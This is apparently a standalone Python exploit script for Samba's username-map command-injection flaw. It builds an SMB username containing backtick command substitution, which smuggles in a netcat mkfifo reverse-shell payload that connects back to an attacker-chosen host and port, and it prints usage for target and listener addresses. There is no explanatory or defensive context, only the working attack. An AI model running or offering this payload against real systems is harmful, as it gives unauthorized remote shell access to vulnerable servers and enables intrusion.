#!/usr/bin/python3

import sys
from smb.SMBConnection import SMBConnection

def exploit(rhost, rport, lhost, lport):
	print("[+] Crafting payload")

	payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f | /bin/sh >/tmp/f 2>&1".format(lhost, lport)

	user = "/=`nohup " + payload + "`"

	conn = SMBConnection(user, "", "", "")

	try:
		conn.connect(rhost, int(rport), timeout=1)
	except:
		print("[+] Check listener")

if __name__ == "__main__":
	if len(sys.argv) != 5:
		print("[-] Usage: python3 script.py <RHOST> <RPORT> <LHOST> <LPORT>")
	else:
		rhost = sys.argv[1]
		rport = sys.argv[2]

		lhost = sys.argv[3]
		lport = sys.argv[4]

		print("[+] Starting exploit")

		exploit(rhost, rport, lhost, lport)